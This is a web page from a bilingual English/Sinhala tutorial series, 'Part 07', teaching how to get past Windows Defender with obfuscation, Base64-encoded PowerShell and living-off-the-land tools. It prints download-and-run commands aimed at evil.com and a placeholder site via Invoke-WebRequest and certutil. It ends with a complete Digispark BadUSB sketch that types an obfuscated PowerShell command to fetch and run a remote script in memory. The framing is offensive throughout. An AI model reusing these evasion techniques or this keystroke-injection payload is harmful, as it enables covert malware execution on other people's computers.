<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Part 07: Advanced techniques to bypass Antivirus detection using Obfuscation, Encoding, and Living-off-the-Land binaries.">
    <title>USB Security Research: AV Evasion | Part 07</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;700&family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">

    <style>
        
        :root {
            --bg-color: #050505;       /* Void Black */
            --text-primary: #dcdcdc;   /* Ghost White */
            --text-dim: #666666;       /* Hidden Grey */
            
            --stealth-red: #cc0000;    /* Alert Red (Subtle) */
            --stealth-purple: #9933ff; /* Magic/Obfuscation */
            --hacker-green: #33ff33;   /* Success */
            
            --panel-bg: #111111;
            --border-dim: #333333;
            --border-highlight: #555555;
            
            --scan-line: rgba(255, 255, 255, 0.03);
        }

        /* RESET & TYPOGRAPHY */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-primary);
            font-family: 'Roboto Mono', monospace;
            font-size: 16px;
            line-height: 1.7;
            /* Subtle Scanline Effect */
            background-image: linear-gradient(0deg, transparent 50%, var(--scan-line) 50%);
            background-size: 100% 4px;
        }

        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 60px 20px;
        }

        /* HEADER: GHOST MODE */
        header {
            border-top: 1px solid var(--border-highlight);
            border-bottom: 1px solid var(--border-highlight);
            padding: 50px 0;
            margin-bottom: 80px;
            text-align: center;
            position: relative;
            background: radial-gradient(circle at center, #1a1a1a 0%, #000 70%);
        }

        header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.5rem;
            letter-spacing: 8px;
            color: var(--text-primary);
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
            text-transform: uppercase;
            opacity: 0.9;
        }

        header .status-bar {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 20px;
            font-size: 0.85rem;
            color: var(--text-dim);
            text-transform: uppercase;
        }

        header .status-bar span {
            border: 1px solid var(--border-dim);
            padding: 5px 15px;
            border-radius: 20px;
        }

        .active { color: var(--hacker-green); border-color: var(--hacker-green) !important; }

        /* SECTIONS: CLASSIFIED FILES LOOK */
        section {
            background-color: rgba(20, 20, 20, 0.6);
            border-left: 2px solid var(--border-dim);
            padding: 40px;
            margin-bottom: 60px;
            transition: all 0.4s ease;
        }

        section:hover {
            border-left-color: var(--stealth-purple);
            background-color: rgba(25, 25, 25, 0.8);
        }

        h2 {
            font-family: 'Rajdhani', sans-serif;
            font-size: 2.2rem;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 30px;
            display: flex;
            align-items: center;
        }

        h2::before {
            content: ">>";
            margin-right: 15px;
            color: var(--stealth-purple);
            font-size: 1.5rem;
        }

        /* TEXT LAYOUT */
        .content-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
        }

        .en-text {
            color: #b0b0b0;
            text-align: justify;
            padding-right: 20px;
        }

        .si-text {
            color: #e0e0e0;
            font-family: 'Iskoola Pota', sans-serif;
            background: linear-gradient(90deg, rgba(153, 51, 255, 0.05), transparent);
            padding: 25px;
            border-left: 3px solid var(--stealth-purple);
            line-height: 1.9;
        }

        /* DIAGRAMS: ASCII ART OPACITY */
        .stealth-diagram {
            font-family: 'Roboto Mono', monospace;
            background-color: #0a0a0a;
            color: var(--text-dim);
            padding: 30px;
            border: 1px dashed var(--border-dim);
            white-space: pre;
            overflow-x: auto;
            text-align: center;
            margin: 30px 0;
            transition: color 0.3s;
        }

        .stealth-diagram:hover {
            color: var(--stealth-purple);
            border-color: var(--stealth-purple);
        }

        /* CODE SNIPPETS: OBFUSCATED LOOK */
        .code-box {
            background-color: #080808;
            border: 1px solid #222;
            padding: 20px;
            margin: 20px 0;
            font-size: 0.9rem;
            position: relative;
        }

        .code-box::after {
            content: "CONFIDENTIAL // CODE SNIPPET";
            position: absolute;
            top: 5px;
            right: 10px;
            font-size: 0.7rem;
            color: #444;
        }

        pre { overflow-x: auto; }
        code { color: #ccc; }

        .keyword { color: #ff79c6; }
        .string { color: #f1fa8c; }
        .comment { color: #6272a4; font-style: italic; opacity: 0.7; }
        .obfuscated { color: #8be9fd; filter: blur(0.5px); transition: filter 0.3s; }
        .obfuscated:hover { filter: blur(0); }

        /* DEFENDER ALERT BOX */
        .defender-alert {
            border: 1px solid var(--stealth-red);
            background: rgba(204, 0, 0, 0.05);
            color: #ff9999;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 20px;
            font-family: 'Rajdhani', sans-serif;
            font-weight: bold;
        }

        .defender-icon {
            font-size: 2rem;
        }

        /* FOOTER */
        footer {
            margin-top: 100px;
            text-align: center;
            color: var(--text-dim);
            font-size: 0.8rem;
            border-top: 1px solid #222;
            padding-top: 30px;
        }

    </style>
</head>
<body>

    <div class="container">

        <header>
            <h1>PART 07: GHOST PROTOCOL</h1>
            <div class="status-bar">
                <span class="active">STEALTH: ENABLED</span>
                <span>TARGET: WINDOWS DEFENDER</span>
                <span>METHOD: OBFUSCATION</span>
            </div>
        </header>

        <section id="chapter-24">
            <h2>24. Know Your Enemy: How Antivirus Works</h2>
            
            <div class="content-grid">
                <div class="en-text">
                    <p>Before we can bypass Windows Defender, we must understand how it catches us. Modern AVs use two main methods:</p>
                    <ul>
                        <li><strong>Signature Detection:</strong> It compares your file against a database of known bad files. If your code matches a known virus (e.g., standard Metasploit payload), it gets blocked instantly.</li>
                        <li><strong>Heuristic Analysis:</strong> It watches behavior. If a script tries to download a file from the internet and execute it immediately, the AV flags it as "Suspicious Behavior".</li>
                    </ul>
                </div>

                <div class="si-text">
                    <p><strong>24. ‡∑É‡∂≠‡∑î‡∂ª‡∑è ‡∑Ñ‡∂≥‡∑î‡∂±‡∑è‡∂ú‡∑ê‡∂±‡∑ì‡∂∏: Antivirus ‡∂ö‡∑ä‚Äç‡∂ª‡∑í‡∂∫‡∑è‡∂ö‡∂ª‡∂± ‡∂Ü‡∂ö‡∑è‡∂ª‡∂∫</strong><br>
                    Windows Defender ‡∂ë‡∂ö ‡∂¥‡∂ª‡∂Ø‡∑ä‡∂Ø‡∂±‡∑ä‡∂± ‡∂ö‡∂Ω‡∑í‡∂±‡∑ä ‡∂Ö‡∂¥‡∑í ‡∂Ø‡∑ê‡∂±‡∂ú‡∂±‡∑ä‡∂± ‡∂ï‡∂±‡∑ö ‡∂í‡∂ö ‡∂ö‡∑ú‡∑Ñ‡∑ú‡∂∏‡∂Ø ‡∂Ö‡∂¥‡∑í‡∑Ä ‡∂Ö‡∂Ω‡∑ä‡∂Ω‡∂±‡∑ä‡∂±‡∑ö ‡∂ö‡∑í‡∂∫‡∂Ω‡∑è. ‡∂í‡∂ö ‡∂¥‡∑ä‚Äç‡∂ª‡∂∞‡∑è‡∂± ‡∂ö‡∑ä‚Äç‡∂ª‡∂∏ ‡∂Ø‡∑ô‡∂ö‡∂ö‡∑ä ‡∂¥‡∑è‡∑Ä‡∑í‡∂†‡∑ä‡∂†‡∑í ‡∂ö‡∂ª‡∂±‡∑Ä‡∑è:<br>
                    1. <strong>Signature Detection (‡∑Ñ‡∑ê‡∂©‡∂∫ ‡∂∂‡∑ê‡∂Ω‡∑ì‡∂∏):</strong> ‡∂∏‡∑ö‡∂ö ‡∑Ñ‡∂ª‡∑í‡∂∫‡∂ß ‡∂¥‡∑ú‡∂Ω‡∑í‡∑É‡∑í‡∂∫ ‡∑Ö‡∂ü ‡∂≠‡∑í‡∂∫‡∑ô‡∂± ‡∂Ö‡∂¥‡∂ª‡∑è‡∂∞‡∂ö‡∂ª‡∑î‡∑Ä‡∂±‡∑ä‡∂ú‡∑ö ‡∑Ü‡∑ú‡∂ß‡∑ù ‡∂á‡∂Ω‡∑ä‡∂∂‡∂∏‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∑Ä‡∂ú‡∑ö. ‡∂î‡∂∫‡∑è ‡∂Ω‡∑í‡∂∫‡∂± ‡∂ö‡∑ù‡∂©‡∑ä ‡∂ë‡∂ö ‡∂í ‡∂á‡∂Ω‡∑ä‡∂∂‡∂∏‡∑ä ‡∂ë‡∂ö‡∑ö ‡∂≠‡∑í‡∂∫‡∑ô‡∂± ‡∂¥‡∂ª‡∂´ ‡∑Ä‡∂∫‡∑í‡∂ª‡∑É‡∑ä ‡∂ë‡∂ö‡∂ö‡∂ß ‡∑É‡∂∏‡∑è‡∂± ‡∂±‡∂∏‡∑ä, ‡∂í‡∂ö ‡∂Ø‡∑ê‡∂ö‡∑ä‡∂ö ‡∂ú‡∂∏‡∂±‡∑ä ‡∂Ö‡∂Ω‡∑ä‡∂Ω‡∂±‡∑Ä‡∑è.<br>
                    2. <strong>Heuristic Analysis (‡∑Ñ‡∑ê‡∑É‡∑í‡∂ª‡∑ì‡∂∏ ‡∂∂‡∑ê‡∂Ω‡∑ì‡∂∏):</strong> ‡∂î‡∂∫‡∑è‡∂ú‡∑ö ‡∂ö‡∑ù‡∂©‡∑ä ‡∂ë‡∂ö ‡∂Ö‡∂Ω‡∑î‡∂≠‡∑ä ‡∑Ä‡∑î‡∂´‡∂≠‡∑ä, ‡∂í‡∂ö ‡∂ö‡∂ª‡∂± ‡∑Ä‡∑ê‡∂© ‡∂Ø‡∑í‡∑Ñ‡∑è ‡∂∂‡∂Ω‡∂±‡∑Ä‡∑è. ‡∂ã‡∂Ø‡∑è‡∑Ñ‡∂ª‡∂´‡∂∫‡∂ö‡∂ß, ‡∂â‡∂±‡∑ä‡∂ß‡∂ª‡∑ä‡∂±‡∑ô‡∂ß‡∑ä ‡∂ë‡∂ö‡∑ô‡∂±‡∑ä ‡∑Ü‡∂∫‡∑í‡∂Ω‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∂‡∑è‡∂ú‡∑ô‡∂± ‡∂í‡∂ö ‡∂ª‡∂±‡∑ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂± ‡∑Ñ‡∑ê‡∂Ø‡∑î‡∑Ä‡∑ú‡∂≠‡∑ä, Defender ‡∂ë‡∂ö‡∂ß ‡∑É‡∑ê‡∂ö ‡∑Ñ‡∑í‡∂≠‡∑ô‡∂±‡∑Ä‡∑è.</p>
                </div>

                <div class="defender-alert">
                    <span class="defender-icon">üõ°Ô∏è</span>
                    <div>
                        <strong>WINDOWS DEFENDER ALERT:</strong><br>
                        "Threat Found: Trojan:PowerShell/MaliciousScript.A"<br>
                        (This is what happens when you don't use obfuscation.)
                    </div>
                </div>
            </div>
        </section>

        <section id="chapter-25">
            <h2>25. The Art of Obfuscation (Masking)</h2>
            
            <div class="content-grid">
                <div class="en-text">
                    <p><strong>Obfuscation</strong> is the art of making your code look unreadable to the Antivirus, while still being executable by the computer. Think of it as writing a letter in a secret code that only the recipient understands.</p>
                    <p>Common Techniques:</p>
                    <ul>
                        <li><strong>String Splitting:</strong> Instead of writing <code>"http"</code>, write <code>"h"+"t"+"t"+"p"</code>. The AV looks for "http" but can't find it.</li>
                        <li><strong>Case Mixing:</strong> <code>PoWeRsHeLL</code> is the same as <code>powershell</code> to Windows, but different to some signature scanners.</li>
                        <li><strong>Variable Renaming:</strong> Change <code>$password</code> to <code>$x12a</code>.</li>
                    </ul>
                </div>

                <div class="si-text">
                    <p><strong>25. ‡∑Ä‡∑ô‡∑É‡∑ä ‡∑Ä‡∂Ω‡∑è ‡∂ú‡∑ê‡∂±‡∑ì‡∂∏ (Obfuscation)</strong><br>
                    Obfuscation ‡∂ö‡∑í‡∂∫‡∂±‡∑ä‡∂±‡∑ö ‡∂Ö‡∂¥‡∑ö ‡∂ö‡∑ù‡∂©‡∑ä ‡∂ë‡∂ö ‡∂ö‡∑í‡∂∫‡∑Ä‡∂±‡∑ä‡∂± ‡∂∂‡∑ê‡∂ª‡∑í ‡∑Ä‡∑í‡∂Ø‡∑í‡∑Ñ‡∂ß, ‡∑Ñ‡∑ê‡∂∂‡∑ê‡∂∫‡∑í ‡∑Ä‡∑ê‡∂© ‡∂ö‡∂ª‡∂± ‡∑Ä‡∑í‡∂Ø‡∑í‡∑Ñ‡∂ß ‡∑Ä‡∑ô‡∂±‡∑É‡∑ä ‡∂ö‡∂ª‡∂± ‡∂ö‡∂Ω‡∑è‡∑Ä‡∂ß. ‡∂∏‡∑ö‡∂ö ‡∑Ñ‡∂ª‡∑í‡∂∫‡∂ß Antivirus ‡∂ë‡∂ö‡∂ß ‡∂±‡∑ú‡∂≠‡∑ö‡∂ª‡∑ô‡∂± ‡∂∑‡∑è‡∑Ç‡∑è‡∑Ä‡∂ö‡∑í‡∂±‡∑ä ‡∂ö‡∂≠‡∑è ‡∂ö‡∂ª‡∂±‡∑Ä‡∑è ‡∑Ä‡∂ú‡∑ö.<br><br>
                    <strong>‡∑É‡∂ª‡∂Ω ‡∂ã‡∂Ø‡∑è‡∑Ñ‡∂ª‡∂´:</strong><br>
                    1. <strong>‡∑Ä‡∂†‡∂± ‡∂ö‡∑ê‡∂©‡∑ì‡∂∏:</strong> `powershell` ‡∂ö‡∑í‡∂∫‡∂Ω‡∑è ‡∂ö‡∑ô‡∑Ö‡∑í‡∂±‡∑ä‡∂∏ ‡∂Ω‡∑í‡∂∫‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ê‡∂≠‡∑î‡∑Ä `("po"+"wer"+"shell")` ‡∂ö‡∑í‡∂∫‡∂Ω‡∑è ‡∂Ω‡∑í‡∂∫‡∂±‡∑Ä‡∑è. ‡∂ë‡∂≠‡∂ö‡∑ú‡∂ß AV ‡∂ë‡∂ö‡∂ß ‡∂í‡∂ö ‡∑Ñ‡∑ú‡∂∫‡∂±‡∑ä‡∂± ‡∂∂‡∑ë.<br>
                    2. <strong>‡∂Ö‡∂ö‡∑î‡∂ª‡∑î ‡∂∏‡∑è‡∂ª‡∑î ‡∂ö‡∑í‡∂ª‡∑ì‡∂∏:</strong> `NetSh` ‡∑É‡∑Ñ `nEtSh` ‡∑Ä‡∑í‡∂±‡∑ä‡∂©‡∑ù‡∑É‡∑ä ‡∑Ä‡∂Ω‡∂ß ‡∂ë‡∂ö‡∂∫‡∑í, ‡∂í‡∂≠‡∑ä ‡∑É‡∂∏‡∑Ñ‡∂ª AV ‡∑Ä‡∂Ω‡∂ß ‡∂Ø‡∑ô‡∂ö‡∂ö‡∑ä.<br>
                    3. <strong>‡∂±‡∂∏‡∑ä ‡∑Ä‡∑ô‡∂±‡∑É‡∑ä ‡∂ö‡∑í‡∂ª‡∑ì‡∂∏:</strong> `$pass` ‡∑Ä‡∂ú‡∑ö ‡∂¥‡∑ê‡∑Ñ‡∑ê‡∂Ø‡∑í‡∂Ω‡∑í ‡∂±‡∂∏‡∑ä ‡∑Ä‡∑ô‡∂±‡∑î‡∑Ä‡∂ß `$a7x` ‡∑Ä‡∂ú‡∑ö ‡∂≠‡∑ö‡∂ª‡∑î‡∂∏‡∂ö‡∑ä ‡∂±‡∑ê‡∂≠‡∑í ‡∂±‡∂∏‡∑ä ‡∂Ø‡∑è‡∂±‡∑Ä‡∑è.</p>
                </div>

                <div class="stealth-diagram">
      [ ORIGINAL CODE ]                 [ OBFUSCATED CODE ]
      
      Invoke-WebRequest                 I`n`v`o`k`e-W`e`b`R`e`q`u`e`s`t
      -Uri "http://evil.com"            -Uri ("ht"+"tp://"+"ev"+"il.com")
      -OutFile "virus.exe"              -OutFile $env:TEMP+"\v.e"
      
      (Clear to AV)                     (Confusing to AV)
                </div>
            </div>
        </section>

        <section id="chapter-26">
            <h2>26. The Invisible Cloak: Base64 Encoding</h2>
            
            <div class="content-grid">
                <div class="en-text">
                    <p>The most powerful way to hide a payload is to encode it entirely into <strong>Base64</strong>. Base64 turns your script into a long string of random letters and numbers. PowerShell has a special flag <code>-EncodedCommand</code> that allows it to run this gibberish directly.</p>
                    <p>To the Antivirus, it just looks like a random text string, not a malicious script. This is how we sneak past the "Signature Detection".</p>
                </div>

                <div class="si-text">
                    <p><strong>26. ‡∂Ö‡∂Ø‡∑ò‡∑Å‡∑ä‚Äç‡∂∫‡∂∏‡∑è‡∂± ‡∂ö‡∂∂‡∑è‡∂∫: Base64 Encoding</strong><br>
                    ‡∂Ö‡∂¥‡∑ö ‡∂∏‡∑î‡∑Ö‡∑î ‡∑É‡∑ä‡∂ö‡∑ä‚Äç‡∂ª‡∑í‡∂¥‡∑ä‡∂ß‡∑ä ‡∂ë‡∂ö‡∂∏ ‡∑Ñ‡∂Ç‡∂ú‡∂±‡∑ä‡∂± ‡∂¥‡∑î‡∑Ö‡∑î‡∑Ä‡∂±‡∑ä ‡∑Ñ‡∑ú‡∂≥‡∂∏ ‡∑Ä‡∑í‡∂Ø‡∑í‡∑Ñ ‡∂≠‡∂∏‡∂∫‡∑í <strong>Base64</strong> ‡∑Ä‡∂Ω‡∂ß ‡∑Ñ‡∂ª‡∑Ä‡∂± ‡∂ë‡∂ö. Base64 ‡∂ö‡∑í‡∂∫‡∂±‡∑ä‡∂±‡∑ö ‡∂Ö‡∂¥‡∑ö ‡∂ö‡∑ù‡∂©‡∑ä ‡∂ë‡∂ö ‡∂â‡∂Ç‡∂ú‡∑ä‚Äç‡∂ª‡∑ì‡∑É‡∑í ‡∂Ö‡∂ö‡∑î‡∂ª‡∑î ‡∑É‡∑Ñ ‡∂â‡∂Ω‡∂ö‡∑ä‡∂ö‡∂∏‡∑ä ‡∑Ä‡∑ê‡∂Ω‡∂ö‡∑ä ‡∂∂‡∑Ä‡∂ß ‡∂¥‡∂≠‡∑ä ‡∂ö‡∂ª‡∂± ‡∂ö‡∑ä‚Äç‡∂ª‡∂∏‡∂∫‡∂ö‡∑ä.<br><br>
                    PowerShell ‡∑Ä‡∂Ω ‡∑Ä‡∑í‡∑Å‡∑ö‡∑Ç ‡∂ö‡∂∏‡∑è‡∂±‡∑ä‡∂©‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂≠‡∑í‡∂∫‡∑ô‡∂±‡∑Ä‡∑è `-EncodedCommand` ‡∂ö‡∑í‡∂∫‡∂Ω‡∑è. ‡∂∏‡∑ö‡∂ö ‡∂¥‡∑è‡∑Ä‡∑í‡∂†‡∑ä‡∂†‡∑í ‡∂ö‡∑Ö‡∑è‡∂∏, ‡∂Ö‡∂ª ‡∂≠‡∑ö‡∂ª‡∑î‡∂∏‡∂ö‡∑ä ‡∂±‡∑ê‡∂≠‡∑í ‡∂Ö‡∂ö‡∑î‡∂ª‡∑î ‡∑Ä‡∑ê‡∂Ω ‡∂ö‡∑ô‡∑Ö‡∑í‡∂±‡∑ä‡∂∏ ‡∂ö‡∂∏‡∑è‡∂±‡∑ä‡∂©‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∑Ä‡∑í‡∂Ø‡∑í‡∑Ñ‡∂ß ‡∂ª‡∂±‡∑ä ‡∑Ä‡∑ô‡∂±‡∑Ä‡∑è. Antivirus ‡∂ë‡∂ö‡∂ß ‡∂¥‡∑ö‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑í‡∂ö‡∂±‡∑ä‡∂∏ ‡∂Ö‡∂ö‡∑î‡∂ª‡∑î ‡∂ß‡∑í‡∂ö‡∂ö‡∑ä ‡∑Ä‡∑í‡∂≠‡∂ª‡∂∫‡∑í. ‡∂∏‡∑ö‡∂ö‡∑ô‡∂±‡∑ä ‡∂Ö‡∂¥‡∑í‡∂ß "Signature Detection" ‡∂ë‡∂ö ‡∂Ω‡∑ö‡∑É‡∑í‡∂∫‡∑ô‡∂±‡∑ä‡∂∏ ‡∂∏‡∂ú‡∑Ñ‡∂ª‡∑í‡∂±‡∑ä‡∂± ‡∂¥‡∑î‡∑Ö‡∑î‡∑Ä‡∂±‡∑ä.</p>
                </div>

                <div class="code-box">
                    <pre>
<span class="comment"># ORIGINAL PAYLOAD:</span>
<span class="keyword">Write-Host</span> <span class="string">"You have been hacked"</span>

<span class="comment"># CONVERTED TO BASE64:</span>
VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIABoAGEAdgBlACAAYgBlAGUAbgAgAGgAYQBjAGsAZQBkACIA

<span class="comment"># HOW WE RUN IT IN BADUSB:</span>
powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIABoAGEAdgBlACAAYgBlAGUAbgAgAGgAYQBjAGsAZQBkACIA</pre>
                </div>
            </div>
        </section>

        <section id="chapter-27">
            <h2>27. Living off the Land (Using Built-in Tools)</h2>
            
            <div class="content-grid">
                <div class="en-text">
                    <p>Why download a "Virus.exe" when Windows already has tools that can do damage? <strong>Living off the Land (LotL)</strong> means using trusted Windows tools (like CertUtil, Bitsadmin, PowerShell) to perform attacks.</p>
                    <p>Example: <strong>CertUtil.exe</strong> is a tool meant for managing certificates. But hackers use it to download files because Windows Defender trusts CertUtil.</p>
                    <p><code>certutil -urlcache -split -f "http://site.com/virus.exe" virus.exe</code></p>
                </div>

                <div class="si-text">
                    <p><strong>27. ‡∂ú‡∑ô‡∂Ø‡∂ª ‡∂∂‡∂©‡∑î ‡∑Ä‡∂Ω‡∑í‡∂±‡∑ä‡∂∏ ‡∂ú‡∑ö‡∂∏ ‡∂Ø‡∑ì‡∂∏ (Living off the Land)</strong><br>
                    ‡∂á‡∂∫‡∑í ‡∂Ö‡∂¥‡∑í ‡∂Ö‡∂Ω‡∑î‡∂≠‡∑í‡∂±‡∑ä "Virus.exe" ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂©‡∑Ä‡∑î‡∂±‡∑ä‡∂Ω‡∑ù‡∂©‡∑ä ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂Ö‡∑Ñ‡∑î ‡∑Ä‡∑ô‡∂±‡∑ä‡∂±‡∑ö? ‡∑Ä‡∑í‡∂±‡∑ä‡∂©‡∑ù‡∑É‡∑ä ‡∂á‡∂≠‡∑î‡∑Ö‡∑ô‡∂∏ ‡∂≠‡∑í‡∂∫‡∑ô‡∂± ‡∑Ñ‡∑ú‡∂≥ ‡∂ß‡∑ñ‡∂Ω‡∑ä‡∑É‡∑ä ‡∂¥‡∑è‡∑Ä‡∑í‡∂†‡∑ä‡∂†‡∑í ‡∂ö‡∂ª‡∂Ω‡∑è ‡∂Ö‡∂¥‡∑í‡∂ß ‡∂í ‡∂Ø‡∑ö‡∂∏ ‡∂ö‡∂ª‡∂±‡∑ä‡∂± ‡∂¥‡∑î‡∑Ö‡∑î‡∑Ä‡∂±‡∑ä. ‡∂∏‡∑ö‡∂ö‡∂ß ‡∂ö‡∑í‡∂∫‡∂±‡∑ä‡∂±‡∑ö **Living off the Land (LotL)** ‡∂ö‡∑í‡∂∫‡∂Ω‡∑è.<br><br>
                    ‡∂ã‡∂Ø‡∑è‡∑Ñ‡∂ª‡∂´‡∂∫‡∂ö‡∑ä: <strong>CertUtil.exe</strong> ‡∂ö‡∑í‡∂∫‡∂±‡∑ä‡∂±‡∑ö ‡∑É‡∑Ñ‡∂≠‡∑í‡∂ö (Certificates) ‡∂ö‡∑Ö‡∂∏‡∂±‡∑è‡∂ö‡∂ª‡∂´‡∂∫ ‡∂ö‡∂ª‡∂± ‡∂ß‡∑ñ‡∂Ω‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä. ‡∂í‡∂≠‡∑ä ‡∑Ñ‡∑ê‡∂ö‡∂ª‡∑ä‡∂Ω‡∑è ‡∂∏‡∑ö‡∂ö ‡∂¥‡∑è‡∑Ä‡∑í‡∂†‡∑ä‡∂†‡∑í ‡∂ö‡∂ª‡∂±‡∑Ä‡∑è ‡∑Ä‡∂∫‡∑í‡∂ª‡∑É‡∑ä ‡∂©‡∑Ä‡∑î‡∂±‡∑ä‡∂Ω‡∑ù‡∂©‡∑ä ‡∂ö‡∂ª‡∂±‡∑ä‡∂±. ‡∂∏‡∑ú‡∂ö‡∂Ø Defender ‡∂ë‡∂ö CertUtil ‡∑Ä ‡∑Ä‡∑í‡∑Å‡∑ä‡∑Ä‡∑è‡∑É ‡∂ö‡∂ª‡∂±‡∑Ä‡∑è. "‡∂∏‡∑ö‡∂ö ‡∑Ä‡∑í‡∂±‡∑ä‡∂©‡∑ù‡∑É‡∑ä‡∂Ω‡∂ú‡∑ô‡∂∏ ‡∂∂‡∂©‡∑î‡∑Ä‡∂ö‡∑ä‡∂±‡∑ö, ‡∂∏‡∑ö‡∂ö ‡∂±‡∂ª‡∂ö ‡∑Ä‡∑ô‡∂±‡∑ä‡∂± ‡∂∂‡∑ë" ‡∂ö‡∑í‡∂∫‡∂Ω‡∑è Defender ‡∑Ñ‡∑í‡∂≠‡∂±‡∑Ä‡∑è.</p>
                </div>
            </div>
        </section>

        <section id="chapter-28">
            <h2>28. The Final Stealth Payload</h2>
            
            <div class="content-grid">
                <div class="en-text">
                    <p>Putting it all together. We will create a BadUSB script that:</p>
                    <ol>
                        <li>Opens the "Run" dialog (Win+R) - This is a blind spot for many AVs.</li>
                        <li>Types a tiny PowerShell command that downloads and executes the real payload from memory (Fileless Malware).</li>
                        <li>Uses string splitting to hide the word "PowerShell".</li>
                    </ol>
                </div>

                <div class="si-text">
                    <p><strong>28. ‡∂Ö‡∑Ä‡∑É‡∑è‡∂± ‡∂¥‡∑ö‡∂Ω‡∑ù‡∂©‡∑ä ‡∂ë‡∂ö (The Stealth Script)</strong><br>
                    ‡∂Ø‡∑ê‡∂±‡∑ä ‡∂Ö‡∂¥‡∑í ‡∂â‡∂ú‡∑ô‡∂± ‡∂ú‡∂≠‡∑ä‡∂≠ ‡∑Ñ‡∑ê‡∂∏‡∂Ø‡∑ö‡∂∏ ‡∂ë‡∂ö‡∂≠‡∑î ‡∂ö‡∂ª‡∂Ω‡∑è ‡∑É‡∑î‡∂¥‡∑í‡∂ª‡∑í ‡∑É‡∑ä‡∂ö‡∑ä‚Äç‡∂ª‡∑í‡∂¥‡∑ä‡∂ß‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∑Ñ‡∂Ø‡∂∏‡∑î. ‡∂∏‡∑ö‡∂ö‡∑ö ‡∂¥‡∑í‡∂∫‡∑Ä‡∂ª:<br>
                    1. Win+R ‡∂ú‡∑Ñ‡∂Ω‡∑è Run Box ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±‡∑Ä‡∑è (‡∂∏‡∑ö‡∂ö ‡∂ú‡∑ú‡∂©‡∂ö‡∑ä AV ‡∑Ä‡∂Ω‡∂ß ‡∂¥‡∑ö‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ë).<br>
                    2. ‡∂∂‡∑ú‡∑Ñ‡∑ú‡∂∏ ‡∂¥‡∑î‡∂Ç‡∂†‡∑í ‡∂ö‡∂∏‡∑è‡∂±‡∑ä‡∂©‡∑ä ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂ß‡∂∫‡∑í‡∂¥‡∑ä ‡∂ö‡∂ª‡∂±‡∑Ä‡∑è. ‡∂í‡∂ö‡∑ô‡∂±‡∑ä ‡∂Ö‡∂¥‡∑ö ‡∂Ω‡∑ú‡∂ö‡∑î ‡∂¥‡∑ö‡∂Ω‡∑ù‡∂©‡∑ä ‡∂ë‡∂ö ‡∂â‡∂±‡∑ä‡∂ß‡∂ª‡∑ä‡∂±‡∑ô‡∂ß‡∑ä ‡∂ë‡∂ö‡∑ô‡∂±‡∑ä ‡∂Ö‡∂ª‡∂±‡∑ä ‡∂∏‡∑ô‡∂∏‡∂ª‡∑í ‡∂ë‡∂ö‡∑ö‡∂∏ ‡∂ª‡∂±‡∑ä ‡∂ö‡∂ª‡∂±‡∑Ä‡∑è (Fileless). ‡∑Ñ‡∑è‡∂©‡∑ä ‡∂©‡∑í‡∑É‡∑ä‡∂ö‡∑ä ‡∂ë‡∂ö‡∂ß ‡∂∏‡∑î‡∂ö‡∑î‡∂≠‡∑ä ‡∑É‡∑ö‡∑Ä‡∑ä ‡∑Ä‡∑ô‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ë.<br>
                    3. ‡∂Ö‡∂¥‡∑í "PowerShell" ‡∂ö‡∑í‡∂∫‡∂± ‡∑Ä‡∂†‡∂±‡∑ö ‡∂ö‡∑ë‡∂Ω‡∑í ‡∂ö‡∑ë‡∂Ω‡∑í ‡∑Ä‡∂Ω‡∂ß ‡∂ö‡∂©‡∂Ω‡∑è ‡∂Ω‡∑í‡∂∫‡∂±‡∑Ä‡∑è.</p>
                </div>

                <div class="code-box">
                    <pre>
<span class="comment">// ARDUINO / DIGISPARK CODE FOR STEALTH</span>
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  
  <span class="comment">// 1. Open Run Dialog</span>
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  <span class="comment">// 2. Type Obfuscated Command</span>
  <span class="comment">// Original: powershell -windowstyle hidden IEX (iwr http://bit.ly/payload)</span>
  <span class="comment">// Obfuscated: cmd /c "po"+"wer"+"sh"+"ell" ...</span>
  
  DigiKeyboard.print(<span class="string">"cmd /c echo IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/my_stealth_script') | p\"ow\"ers\"he\"ll -noprofile -"</span>);
  
  <span class="comment">// 3. Execute</span>
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}</pre>
                </div>
            </div>
        </section>

    </div>

    <footer>
        <p>DEV-KUPPIYA RESEARCH LABS | PART 07 OF 10 COMPLETED</p>
        <p>STATUS: UNDETECTED. NEXT: AUTOMATION & PRANKS.</p>
    </footer>

</body>
</html>
